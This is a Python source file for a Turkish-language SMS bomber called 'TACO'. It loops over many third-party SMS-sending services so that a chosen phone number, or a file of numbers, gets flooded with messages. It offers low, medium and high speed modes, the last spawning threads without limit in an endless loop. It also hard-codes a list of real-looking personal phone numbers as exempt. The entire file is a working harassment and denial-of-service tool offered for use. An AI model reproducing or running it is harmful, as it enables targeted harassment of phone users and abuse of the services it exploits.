#TACO
#Enough-Reborn ve CodzaSmsBomber kodlarından yararlanılmıştır
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
import threading

# TACO ASCII Sanatı Başlangıcı
print("""
 TTTTT   AAAAA   CCCC     OOO 
   T     A   A   C       O   O
   T     AAAAA   C       O   O
   T     A   A   C       O   O
   T     A   A   CCCC     OOO 

""")
# TACO ASCII Sanatı 

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

# Korunan telefon numaraları (10 haneli, başında 0 veya +90 olmadan)
korunan_numaralar = ["5015645612", "5059390866", "5052309038", "5053134790", "5549610866", "5419610866", "5362850738", "5070724038", "5421296377"]  # Örnek numaralar, istediğin gibi ekle

while 1:
    system("cls||clear")
    print("""{}
    
    Sms: {}           {}by {}@Taco\n  
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Düşük Hız)\n\n 2- SMS Gönder (Orta Hız)\n\n 3- SMS Gönder (Yüksek Hız)\n\n 4- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Lütfen tekrar deneyiniz.")
        sleep(3)
        continue

    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' veya '0' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Lütfen tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
                sleep(3)
                continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "E-posta adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS (kısa mesaj) göndermek istiyorsun: {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla mesaj (SMS) göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        system("cls||clear")
        if kere is None: 
            for i in tel_liste:
                if i in korunan_numaralar:
                    print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {i}")
                    continue
                sms = SendSms(i, mail)
                while True:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                exec("sms."+attribute+"()")
                                sleep(aralik)
        else:
            for i in tel_liste:
                if i in korunan_numaralar:
                    print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {i}")
                    continue
                sms = SendSms(i, mail)
                while sms.adet < kere:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                if sms.adet == kere:
                                    break
                                exec("sms."+attribute+"()")
                                sleep(aralik)

        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()

    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' veya '0' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        if tel_no in korunan_numaralar:
            print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {tel_no}")
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "E-posta adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        dur = threading.Event()
        def Normal():
            while not dur.is_set():
                thread = []
                for fonk in servisler_sms:
                    t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                    thread.append(t)
                    t.start()
                for t in thread:
                    t.join()
        try:
            Normal()
        except KeyboardInterrupt:
            dur.set()
            system("cls||clear")
            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
            sleep(2)

    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' veya '0' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        if tel_no in korunan_numaralar:
            print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {tel_no}")
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "E-posta adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
            sleep(3)
            continue

        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        dur = threading.Event()
        def Hızlı():
            while not dur.is_set():
                for fonk in servisler_sms:
                    t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                    t.start()
        try:
            Hızlı()
        except KeyboardInterrupt:
            dur.set()
            system("cls||clear")
            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
            sleep(2)
            
    elif menu == 4:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
